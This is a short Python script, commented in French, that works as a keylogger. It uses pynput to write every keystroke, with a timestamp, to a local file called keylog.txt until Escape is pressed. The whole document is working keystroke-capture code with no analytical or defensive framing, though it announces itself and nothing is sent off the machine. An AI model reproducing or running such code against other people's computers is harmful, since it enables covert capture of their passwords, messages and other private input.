from pynput import keyboard
import datetime

# Variable pour contrôler l'arrêt du keylogger
stop_keylogger = False

# Fonction pour enregistrer les frappes au clavier
def on_press(key):
    global stop_keylogger

    try:
        # Si la touche Échap est pressée, arrêter le keylogger
        if key == keyboard.Key.esc:
            print("Keylogger arrêté.")
            stop_keylogger = True
            return False  # Cela arrête l'écoute du clavier

        # Enregistrer la touche pressée
        with open("keylog.txt", "a") as f:
            f.write(f"{datetime.datetime.now()} - {key}\n")
    except Exception as e:
        print(f"Erreur : {e}")

# Démarrer l'écoute du clavier
def start_keylogger():
    print("Keylogger démarré. Appuyez sur Échap pour arrêter.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Point d'entrée du programme
if __name__ == "__main__":
    start_keylogger()